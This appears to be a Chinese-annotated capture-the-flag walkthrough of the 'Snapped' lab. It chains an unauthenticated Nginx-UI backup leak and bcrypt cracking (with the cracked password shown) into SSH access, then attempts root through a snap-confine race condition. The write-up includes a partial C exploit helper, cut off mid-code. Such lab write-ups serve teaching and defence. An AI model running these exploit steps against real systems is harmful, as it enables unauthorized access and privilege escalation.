## Snapped
```
[★]$ nmap -sC -sV 10.129.17.89
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-08 03:08 CDT
Nmap scan report for 10.129.17.89
Host is up (0.012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```
[★]$ echo '10.129.17.89 snapped.htb' | sudo tee -a /etc/hosts
```
#### 这似乎是一家名为 Snapped 的公司的 Apache 基础设施平台网站。这似乎是一家名为 Snapped 的公司的 Apache 基础设施平台网站。主页上似乎没有什么有趣的内容，所以让我们用 FFUF 查找可能访问的其他子域或目录。
```
[★]$ ls /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
```
<details>
<summary>http://FUZZ.snapped.htb	❌ DNS解析失败</summary>

```
[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://FUZZ.snapped.htb -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.snapped.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [1/100000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: 
```
</details>

<details>
<summary>[http://FUZZ.snapped.htb	❌ DNS解析失败](http://snapped.htb + Host头	✅ 正确)</summary>

```
[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-u http://snapped.htb \
-H "Host: FUZZ.snapped.htb" \
-fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________
mx                      [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 9ms]
...<SNIP>...
admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 19ms]
```
</details>

#### 我们找到管理子域，并将其添加到我们的 /etc/hosts 文件中。然后，当我们在浏览器中访问它时，会看到 Nginx-UI 的默认登录页面，这是一个网站管理服务。
```
[★]$ sudo sed -i '/snapped\.htb$/ s/$/ admin.snapped.htb/' /etc/hosts
```
### Foothold
#### 我们无法使用任何默认凭证登录，所以让我们对 Nginx-UI 进行更多枚举。首先，如果我们观察首次访问 /login 端点时发出的请求，会发现它调用了 /api/install 
![图片](images/2026040801.png)
#### 让我们尝试对其他我们可能能够访问的 /api 端点进行模糊测试。
```
[★]$ ls /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

[★]$ ffuf -w /usr//wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.snapped.htb/api/FUZZ -ic
...<SNIP>...
config                  [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 11ms]
backup                  [Status: 200, Size: 18354, Words: 86, Lines: 64, Duration: 60ms]
settings                [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 17ms]
licenses                [Status: 200, Size: 52782, Words: 9, Lines: 1, Duration: 58ms]
...</SNIP>...
//403 和 200 同时出现 → 很可能存在权限控制点（有价值）
```
#### 我们将会看到各种各样的 403 错误响应，但其中有两个是成功的。其中 /api/backup 这个端点比较有趣。让我们使用 cURL 来查看它会给我们返回什么结果。
```
[★]$ curl -v http://admin.snapped.htb/api/backup
*   Trying 10.129.17.89:80...
* Connected to admin.snapped.htb (10.129.17.89) port 80 (#0)
> GET /api/backup HTTP/1.1
> Host: admin.snapped.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Wed, 08 Apr 2026 09:16:14 GMT
< Content-Type: application/zip
< Content-Length: 18354
< Connection: keep-alive
< Accept-Ranges: bytes
< Cache-Control: must-revalidate
< Content-Description: File Transfer
< Content-Disposition: attachment; filename=backup-20260408-051614.zip  <----
< Content-Transfer-Encoding: binary
< Expires: 0
< Last-Modified: Wed, 08 Apr 2026 09:16:14 GMT
< Pragma: public
< Request-Id: a1f29ccb-ec37-4c6c-97b6-b675ee42e6d5
< X-Backup-Security: u22Nc23m2OgIlYmBtRQwP8VL/pU3IOdzYJ59woAZv/8=:eIthO679S62WMoMLwSDVkg==  <----
< 
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
* Failure writing output to destination
* Closing connection 0
```
#### 它似乎正在发送一个文件，名为“backup-20260319-121113.zip”，并且“X-Backup-Security”这一标头也很有趣。经过一番研究，我们发现 Nginx-ui 版本 2.3.2 存在 CVE-2026-27944 这一漏洞。该漏洞允许未经身份验证的用户访问 /api/backup 端点，同时还会在“X-Backup-Security”响应标头中泄露用于解密备份所需的加密密钥。这就是我们所发现的情况。
https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762
#### 但如果我们想再次确认版本是否正确，我们可以使用这个 POC（演示代码），它会运行各种扫描来在 HTML 标头、可用的 JS 文件以及 /api 端点中搜索版本号。它会立即为我们确认版本。
https://github.com/NULL200OK/-nginxui_discover/blob/main/nginxui_discover.py
```
[★]$ wget https://raw.githubusercontent.com/NULL200OK/-nginxui_discover/refs/heads/main/nginxui_discover.py
```
<details>
<summary>python3 nginxui_discover.py --target http://admin.snapped.htb</summary>

```
[★]$ python3 nginxui_discover.py --target http://admin.snapped.htb


███╗░░██╗██╗░░░██╗██╗░░░░░██╗░░░░░██████╗░░█████╗░░█████╗░  ░█████╗░██╗░░██╗
████╗░██║██║░░░██║██║░░░░░██║░░░░░╚════██╗██╔══██╗██╔══██╗  ██╔══██╗██║░██╔╝
██╔██╗██║██║░░░██║██║░░░░░██║░░░░░░░███╔═╝██║░░██║██║░░██║  ██║░░██║█████═╝░
██║╚████║██║░░░██║██║░░░░░██║░░░░░██╔══╝░░██║░░██║██║░░██║  ██║░░██║██╔═██╗░
██║░╚███║╚██████╔╝███████╗███████╗███████╗╚█████╔╝╚█████╔╝  ╚█████╔╝██║░╚██╗
╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝╚══════╝░╚════╝░░╚════╝░  ░╚════╝░╚═╝░░╚═╝
nginxui_discover.py - Nginx UI Instance Discovery & Version Scanner
Discover Nginx UI web interfaces and identify versions ≤2.3.2 vulnerable to CVE-2026-27944
– NULL200OL-AI💀🔥created by NABEEL


======================================================================
Nginx UI Discovery Scanner - CVE-2026-27944 Version Detection
======================================================================
Threads: 20 | Timeout: 5s | Date: 2026-04-08 04:23:10
======================================================================
[*] Starting scan of 1 targets × 8 ports = 8 checks
[*] Press Ctrl+C to stop...

[1/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%
[2/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%
[3/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%
[4/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%
[5/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%
[6/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%
[7/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%
[8/8] 🔴 VULNERABLE | http://admin.snapped.htb | v≤2.3.2 (vulnerable - header present) | confidence: 80.0%

======================================================================
SCAN SUMMARY
======================================================================
Total targets scanned: 1
Total ports checked: 8
Nginx UI instances found: 8
  - Vulnerable (≤2.3.2): 8
  - Patched/Unknown: 0

[+] Discovered Nginx UI instances:
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
  🔴 http://admin.snapped.htb - v≤2.3.2 (vulnerable - header present)
```
</details>

#### 该端点创建的备份将包含 nginx 和 nginx-ui 的配置文件，包括 nginx-ui 的 database.db 文件。之前链接的 GitHub 告知中还包含了一个用于自动执行以下步骤的演示脚本，但我们将手动完成这些操作。
#### 让我们使用 cURL 访问该端点并下载备份。
```
[★]$ curl -OJ -v http://admin.snapped.htb/api/backup  //-O 按远程文件名保存；-J 使用服务器返回的文件名
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.129.17.89:80...
* Connected to admin.snapped.htb (10.129.17.89) port 80 (#0)
> GET /api/backup HTTP/1.1
> Host: admin.snapped.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Wed, 08 Apr 2026 09:24:59 GMT
< Content-Type: application/zip
< Content-Length: 18354
< Connection: keep-alive
< Accept-Ranges: bytes
< Cache-Control: must-revalidate
< Content-Description: File Transfer
< Content-Disposition: attachment; filename=backup-20260408-052459.zip
< Content-Transfer-Encoding: binary
< Expires: 0
< Last-Modified: Wed, 08 Apr 2026 09:24:59 GMT
< Pragma: public
< Request-Id: 955720ca-0f9c-42e3-b0ec-a8bc539c740d
< X-Backup-Security: Vxc0uRonbp1SeuSBOALRDvKaOKNpN81YXpHcF0SFjcw=:iX85sm7XYqhjH777ZRe5bA==
< 
{ [776 bytes data]
100 18354  100 18354    0     0   262k      0 --:--:-- --:--:-- --:--:--  263k
* Connection #0 to host admin.snapped.htb left intact
[★]$ ls
backup-20260408-052459.zip  
```
#### 我们首先会解密安全头部信息，这将为我们提供密钥：iv 。我们将分别从 base64 格式中对两者进行解码，然后将其转换为十六进制字符串。
```
[★]$ key=$(echo 'Vxc0uRonbp1SeuSBOALRDvKaOKNpN81YXpHcF0SFjcw=' | base64 -d | xxd -p -c 256)
[★]$ echo $key
571734b91a276e9d527ae4813802d10ef29a38a36937cd585e91dc1744858dcc

[★]$ iv=$(echo 'iX85sm7XYqhjH777ZRe5bA==' | base64 -d | xxd -p)
[★]$ echo $iv
897f39b26ed762a8631fbefb6517b96c
```
#### 有了这些，我们就具备了解密备份文件所需的一切条件。首先，我们将把它解压到一个新的文件夹中。目录。
```
[★]$ unzip -d backup backup-20260408-052459.zip
Archive:  backup-20260408-052459.zip
  inflating: backup/hash_info.txt    
  inflating: backup/nginx-ui.zip     
  inflating: backup/nginx.zip
```
#### 然后我们将使用 openssl 来解密 nginx-ui.zip 文件
```
参数	含义
-K	hex格式的 key
-iv	hex格式的 IV

[★]$ cd backup
[~/backup][★]$ ls
hash_info.txt  nginx-ui.zip  nginx.zip

[~/backup][★]$ openssl enc -aes-256-cbc -d -in nginx-ui.zip -out ngixui_decrypted.zip -K 571734b91a276e9d527ae4813802d10ef29a38a36937cd585e91dc1744858dcc -iv 897f39b26ed762a8631fbefb6517b96c

[~/backup][★]$ ls
hash_info.txt  nginx-ui.zip  nginx.zip  ngixui_decrypted.zip
```
#### 这将会生成名为“nginxui_decrypted.zip”的文件，所以我们也要对其进行解压，而在解压后的文件夹中会有一个名为“database.db”的文件。
```
[~/backup][★]$ unzip ngixui_decrypted.zip
Archive:  ngixui_decrypted.zip
  inflating: app.ini                 
  inflating: database.db
```
#### 让我们使用 sqlite3 对其进行检查，列出所有表，然后查看“用户”表的内容。
```
[★]$ sqlite3 database.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     
sqlite> 
sqlite> select * from users;
1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|1||g�

|�7�ĝ�*�:�(��\�D�O�}u#,�|en
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,��զ�H�։��e)5U��Z��KĦ"D���W�|en
sqlite> 
sqlite> .exit
```
#### 我们找到了两个 bcrypt 哈希值，我们可以将它们存入一个文件中，并使用 hashcat 进行破解，但只有第二个哈希值能够成功破解。
```
[~/backup][★]$ echo '$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm' > hash
[~/backup][★]$ echo '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq' | tee -a hash
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
[~/backup][★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[~/backup][★]$ gunzip rockyou.txt.gz
[~/backup][★]$ hashcat -m 3200  hash rockyou.txt

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q
Session..........: hashcat
Status...........: Quit
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
```
#### 我们现在已经在 Nginx-UI 平台上获取到了jonathan的凭证。接下来我们来看看他是否将这些凭证用于 SSH 了。
```
[★]$ ssh jonathan@snapped.htb
jonathan@snapped:~$ cat user.txt
```
### Privilege Escalation
#### 对文件系统进行列举后，我们发现 snapd 正在被使用，并且我们还检查了其版本。
```
jonathan@snapped:~$ snap --version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic

jonathan@snapped:~/snap$ ls -la
total 12
drwx------  3 jonathan jonathan 4096 Mar 20 11:38 .
drwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
drwxr-xr-x  4 jonathan jonathan 4096 Mar 20 11:38 snapd-desktop-integration

```
#### 我们在谷歌上搜索了有关最新 snapd 漏洞的信息，发现 Quayls 发布了这样的声明：所有版本（包括 2.74.2 之前的所有版本）都存在针对默认 Ubuntu 图形用户界面安装的攻击漏洞。目标所使用的 Ubuntu 24.04 系统中，snap-confine 是一个 SUID-root 二进制文件，它会在任何 snap 运行之前构建沙盒环境。而在 Ubuntu 25.10 及更高版本中，snap-confine 则具有相应的权限。这种设置的一部分内容包括创建模拟文件，即可写入的只读文件系统目录的副本。对于 /usr/lib/x86_64-linux-gnu 目录的模拟序列是：
```
1. mount --bind /usr/lib/x86_64-linux-gnu → /tmp/.snap/usr/lib/x86_64-linux-gnu
2. mount -t tmpfs → /usr/lib/x86_64-linux-gnu
3. for each entry in /tmp/.snap/usr/lib/x86_64-linux-gnu:mount --bind entry → /usr/lib/x86_64-linux-gnu/entry
4. umount /tmp/.snap/usr/lib/x86_64-linux-gnu
```
#### 在步骤 1 和步骤 3 之间，攻击者可以篡改 /tmp/.snap/usr/lib/x86_64-linux-gnu 的内容。然后步骤 3 会以 root 身份将攻击者拥有的文件绑定到命名空间中。这是一个典型的 TOCTOU 赛跑条件。不过在此之前，我们需要验证清理操作。频率。我们检查了以下文件：
```
jonathan@snapped:~$ systemctl cat systemd-tmpfiles-clean.timer
[Unit]
Description=Daily Cleanup of Temporary Directories
Documentation=man:tmpfiles.d(5) man:systemd-tmpfiles(8)
ConditionPathExists=!/etc/initrd-release

[Timer]
OnBootSec=15min
OnUnitActiveSec=1d

# /etc/systemd/system/systemd-tmpfiles-clean.timer.d/override.conf
[Timer]
OnBootSec=1m 
OnUnitActiveSec=1m    <---
```
#### 从定时器的设置中我们可以看出，已将其更改为使用“systemd-tmpfiles”进行 1 分钟的清理操作。
```
jonathan@snapped:~$ cat /usr/lib/tmpfiles.d/tmp.conf
D /tmp 1777 root root 4m
#q /var/tmp 1777 root root 30d
```
#### 这意味着，位于 /tmp 目录下任何超过 4 分钟未更新的文件都将被删除，这为利用此漏洞创造了绝佳条件。
```
1.The Precondition: systemd-tmpfiles //前置条件
位于 /tmp 下的“.snap”目录是由“snap-confine”在每次调用时进行维护的。
Ubuntu 24.04将“systemd-tmpfiles-clean.timer”定时器的配置修改为：
删除位于“/tmp”目录下超过 30 天的文件（在“tmp.conf”文件中为“D /tmp 1777 root root 30d”）。
当“.snap”文件进入休眠状态并被清理后，攻击者会重新创建它，由于“/tmp”是可被所有人读写的，所以重新创建的目录将属于攻击者所有。

2.Winning the Race Reliably //可靠的
该辅助程序将 snap-confine 的标准错误输出重定向到一个 AF_UNIX 套接字，其设置为 SO_RCVBUF=1 和 SO_SNDBUF=1 。
这造成了极大的阻塞压力，因为 snap-confine 在每次对标准错误的写入操作中都会阻塞，直到辅助程序读取一个字节。
辅助程序逐字节读取，实际上是在单步执行 snap-confine 的执行过程。
当检测到触发消息 dir：“/tmp/.snap/usr/lib/x86_64-linux-gnu”（在模拟步骤 1 后发出）时（模拟步骤 1 后发出），
snap-confine 在写入过程中被阻塞。攻击者有无限的时间通过 renameat2(RENAME_EXCHANGE) 来执行交换操作。

3./proc/PID/cwd Bypass
/tmp/snap-private-tmp 的权限设置为 700（即根用户对根用户），因此非特权用户无法访问该目录。
然而，访问 /proc/PID/cwd 则会通过进程的挂载命名空间来遵循其工作目录，从而完全绕过了主机权限检查。

4.Dynamic Loader Hijack //动态加载程序劫持
比较结束后，该命名空间内位于 /usr/lib/x86_64-linux-gnu 下的所有库都成为了攻击者所掌控的资源。
用 shellcode 替换 ld-linux-x86-64.so.2 将意味着在这个命名空间中执行的任何 SUID 二进制文件都会以 root 身份触发该 shellcode，
因为内核会在程序本身之前加载 PT_INTERP 中指定的动态链接器，而 SUID 二进制文件的有效权限则会随之生效。

5.Sandbox Escape //“沙盒逃脱”
火狐软件包的 AppArmor 配置文件允许对 /var/snap/firefox/common/ 目录进行写入操作。
一个设置为 SUID 的 bash 脚本会存放在此处，且不受 AppArmor 的限制，能够脱离沙盒环境持续运行。
```
### Exploitation


#### 进入 Firefox 的 snap 安全沙箱界面，并记录下进程 ID。此进程会保持沙箱的挂载命名空间处于活动状态，其 /tmp 目录由主机上的 /tmp/snap-private-tmp/snap.firefox/tmp 进行备份。
----------------------------------------------------------------------
(Terminal 1)
----------------------------------------------------------------------
#### Step 1 — Enter sandbox
<details>
<summary>jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash</summary>

```
jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/local/share/doc /usr/local/share/doc none bind,ro 0 0): cannot open directory "/usr/local/share": permission denied
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gimp/2.0/help /usr/share/gimp/2.0/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gimp/2.0/help" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gtk-doc /usr/share/gtk-doc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gtk-doc" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/javascript/jquery /usr/share/javascript/jquery none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/javascript/jquery" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/javascript/sphinxdoc /usr/share/javascript/sphinxdoc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/javascript/sphinxdoc" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/libreoffice/help /usr/share/libreoffice/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/libreoffice/help" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme /usr/share/sphinx_rtd_theme none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/xubuntu-docs /usr/share/xubuntu-docs none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/xubuntu-docs" because it would affect the host in "/var/lib/snapd"
bash: /home/jonathan/.bashrc: Permission denied
jonathan@snapped:/home/jonathan$ snap --servion
bash: /usr/bin/snap: Permission denied
```
</details>

#### Step 2 — Wait for .snap deletion 
```
jonathan@snapped:/home/jonathan$ cd /tmp       
jonathan@snapped:/tmp$ echo $$
3482
jonathan@snapped:/tmp$ 
jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done

jonathan@snapped:/tmp$ stat ./.snap
stat: cannot statx './.snap': No such file or directory
```
#### 进入 Firefox snap 沙盒并记下其进程 ID。此进程维持着沙盒的挂载名称空间的运行，其 /tmp 目录在主机上由 /tmp/snap-private-tmp/snap.firefox/tmp/ 提供支持。
#### 使用 `touch` 保持 `/tmp` 目录处于活跃状态，同时让 `.snap` 进入休眠状态。30 天后（或手动运行 `systemctl start systemd-tmpfiles-clean.service`），清理程序会将其删除。保持终端 1 打开
----------------------------------------------------------------------
(Terminal 2)
----------------------------------------------------------------------
#### Step 3 — Access sandbox /tmp from outside
```
[★]$ ssh jonathan@snapped.htb
jonathan@snapped.htb's password: linkinpark

jonathan@snapped:/tmp$ cd /proc/3482/cwd
jonathan@snapped:/proc/3482/cwd$ ls -la
total 4
drwxrwxrwt  2 root root 4096 Apr  8 09:09 .
drwxr-xr-x 21 root root  540 Apr  8 09:05 ..
```
#### /proc/PID/cwd 会遵循该进程的挂载命名空间视图，从而绕过了 /tmp/snap-private-tmp/ 上 700 权限（即根用户对根目录的权限）的限制。
#### 使用 --base snapd（无效）会删除缓存的挂载命名空间，但会保留 /tmp 目录。systemd-run 包装器满足了 snap 的 cgroup 要求。出现这个错误是意料之中的，因为失败行为正是导致命名空间被破坏的原因。
#### 我们对本文末尾所包含的辅助程序和附加文件进行了编译和上传。该辅助程序会重新创建 .snap（由攻击者控制的文件），将 285 个真实的库复制到 .exchange 文件夹中，启动 snapconfine 并通过一个小型套接字限制调试输出，检测绑定挂载触发器，并通过 renameat2(RENAME_EXCHANGE) 原子性地交换目录。snap-confine 会恢复运行并以 root 身份绑定挂载我们的文件。我们需要保持这个终端窗口打开，以使进程保持运行状态，从而保持我们被污染的命名空间的运行状态。
```
[★]$ vi firefox_2404.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>
#define SNAP_CONFINE "/usr/lib/snapd/snap-confine"
#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"
#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"
#define REAL_LIBDIR "/snap/core22/current/usr/lib/x86_64-linux-gnu"
#define TRIGGER "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""

static int copy_file(const char *src, const char *dst) {
		int fds = open(src, O_RDONLY);
		if (fds < 0) return -1;
		int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
		if (fdd < 0) { close(fds); return -1; }
		char buf[65536];
		ssize_t n;
		while ((n = read(fds, buf, sizeof(buf))) > 0)
				write(fdd, buf, n);
		close(fds);
		close(fdd);
		return 0;
}


static int setup_snap_and_exchange(const char *payload_so) {
		mkdir(".snap", 0755);
		mkdir(".snap/usr", 0755);
		mkdir(".snap/usr/lib", 0755);
		mkdir(".snap/usr/local", 0755);
		mkdir(".snap/snap", 0755);
		mkdir(".snap/snap/firefox", 0755);
		DIR *d = opendir("/snap/firefox");
		if (d) {
				struct dirent *ent;
				while ((ent = readdir(d)) != NULL) {
								if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {
										char p[512];
										snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);
										mkdir(p, 0755);
										snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);
										mkdir(p, 0755);
								}
				}
				closedir(d);
		}

		mkdir(EXCHANGE_SRC, 0755);

		d= opendir(REAL_LIBDIR);
		if (!d) { perror("opendir real libdir"); return -1; }

		int count = 0;
		struct dirent *ent;
		while ((ent = readdir(d)) != NULL) {
				if (ent->d_name[0] == '.' && 
								(ent->d_name[1] == '\0' ||
				 				(ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
						continue;

				char src[4096], dst[4096];
				snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);
				snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);

				struct stat st;
				if (lstat(src, &st) < 0) continue;
				if (S_ISDIR(st.st_mode)) {
						mkdir(dst, 0755);
				} else if (S_ISLNK(st.st_mode)) {
						char link[4096];
						ssize_t len = readlink(src, link, sizeof(link) - 1);
						if (len > 0) { link[len] = '\0'; symlink(link, dst); }
				} else {
						copy_file(src, dst);
				}
				count++;
		}
		closedir(d);

		printf("[*] Exchange dir ready: %d entries in %s\n", count, EXCHANGE_SRC);
		return 0;
}

static int create_stderr_socket(int *read_fd, int *write_fd) {
		int sv[2];
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
				perror("socketpair"); return -1;
		}
		int bufsize = 1;
		setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
		setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
		setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
		setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
		*read_fd = sv[0];
		*write_fd = sv[1];
		return 0;
}

static int run_and_race(void) {
		int read_fd, write_fd;
		if (create_stderr_socket(&read_fd, &write_fd) < 0) return -1;

		pid_t pid = fork();
		if (pid < 0) { perror("fork"); return -1;}

		if (pid ==0) {
				close(read_fd);
				dup2(write_fd, STDERR_FILENO);
				close(write_fd);
				clearenv();
				setenv("SNAPD_DEBUG", "1", 1);
				setenv("SNAP_INSTANCE_NAME", "firefox", 1);
				execl(SNAP_CONFINE, "snap-confine",
								"--base", "core22",
								"snap.firefox.hook.configure",
								"/bin/sh", "-c",
								"echo $$ > /tmp/race_pid.txt; "
								"stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
								"> /tmp/race_perms.txt 2>&1; "
								"sleep 99994",
								NULL);
				_exit(1);
		}

		close(write_fd);

		char ringbuf[4096];
		int ringpos = 0;
		memset(ringbuf, 0, sizeof(ringbuf));
		int tlen = strlen(TRIGGER);
		char byte;
		ssize_t n;
		int swapped = 0;

		printf("[*] Reading snap-confine output (PID %d)...\n", pid);

		while ((n = read(read_fd, &byte, 1)) > 0)  {
						write(STDOUT_FILENO, &byte, 1);

